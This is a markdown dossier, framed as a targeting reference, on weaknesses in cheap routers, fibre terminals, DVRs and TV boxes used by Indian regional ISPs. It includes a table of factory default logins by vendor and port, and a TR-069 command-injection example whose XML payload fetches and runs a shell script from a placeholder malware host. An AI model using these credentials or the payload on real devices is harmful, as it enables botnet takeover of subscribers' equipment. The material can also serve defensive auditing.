# Target Customer Premises Equipment (CPE) Vulnerabilities

This dossier catalogs the hardware platforms, OEM firmware architectures, and common vulnerabilities observed across Indian Tier-2/3 broadband access deployments.

---

## 1. Regional ISP CPE Hardware Landscape

In regional Indian FTTH deployments, Class-B and Class-C ISPs deploy low-cost Customer Premises Equipment to minimize initial subscriber provisioning costs:

| Device Category | Dominant Brands / OEMs | Operating System / Chipset | Known Weaknesses |
| :--- | :--- | :--- | :--- |
| **GPON / EPON ONT** | Syrotech, Netlink, Digisol, DBC, Optilink, RicherLink | Linux 2.6/3.x on Realtek RTL960x or HiSilicon chipsets | Hardcoded vendor superuser accounts; unauthenticated Web/CWMP interfaces exposed on WAN. |
| **Broadband Wi-Fi Routers** | TP-Link (WR841N, Archer C6), D-Link (DIR-615, DIR-825), Tenda (N300, AC10) | MIPS/ARM OpenWrt-derived vendor firmware | Legacy UPnP vulnerabilities (CVE-2020-10987); predictable administrative passwords. |
| **Surveillance DVR/NVR** | CP PLUS, Dahua, Hikvision, HiSilicon OEM clones | Embedded Linux on HiSilicon Hi35xx | Default credentials (`admin:admin`, `admin:888888`); unauthenticated RTSP stream leaks; Dahua backdoor (CVE-2021-33044). |
| **AOSP TV Boxes** | AllWinner H616, Rockchip RK3328 (T95, MXQ Pro 4K clones) | Android 10/11 AOSP (Uncertified) | Pre-installed firmware rootkits (BadBox); open ADB over Wi-Fi (`port 5555`). |

---

## 2. Hardcoded & Factory Default Credentials

Mass automated malware attacks (Mirai variants, Gafgyt, Reaper) exploit vendor-standard administrative credentials that residential subscribers rarely modify:

| Platform / Vendor | Port | Username | Password | Vulnerability / Impact |
| :--- | :--- | :--- | :--- | :--- |
| **Syrotech GPON ONT** | 80, 23 | `admin` | `sysadmin` / `stdONUiEPON` | Full administrative Web & Telnet shell. |
| **Netlink GPON ONT** | 80, 23 | `admin` | `stdONUiEPON` / `admin` | Full device reconfiguration and DNS hijacking. |
| **CP PLUS DVR/Cameras** | 80, 37777 | `admin` | `admin` / `123456` | Direct binary execution, Mirai DVR propagation. |
| **D-Link Residential** | 80, 23 | `Admin` | `[blank]` / `admin` | WAN management exploit. |
| **Huawei HG532** | 7547 | `admin` | `admin` | UPnP SOAP command injection (CVE-2017-17215). |

---

## 3. CWMP / TR-069 Exploitation Mechanics

The Broadband Forum Technical Report **TR-069** (CPE WAN Management Protocol) defines bidirectional SOAP/HTTP communication between CPE and the ISP's Auto Configuration Server (ACS) over port **7547** or **7548**:

### Attack Mechanics:
1. **Misconfigured WAN Exposure:** Many budget ONTs expose the CWMP port to the public WAN interface without access control lists restricting it to the ISP's ACS IP subnet.
2. **NTP/DNS Command Injection:** Vulnerable CWMP implementations (such as the widespread RomPager and Realtek SDK flaws) parse SOAP requests without input sanitation:
   ```xml
   <NewNTPServer1>`/bin/busybox wget http://malware.domain/sh -O /tmp/sh && sh /tmp/sh`</NewNTPServer1>
   ```
3. **Execution:** The CPE executes the injected shell command with `root` privileges, downloading and launching the worm binary.
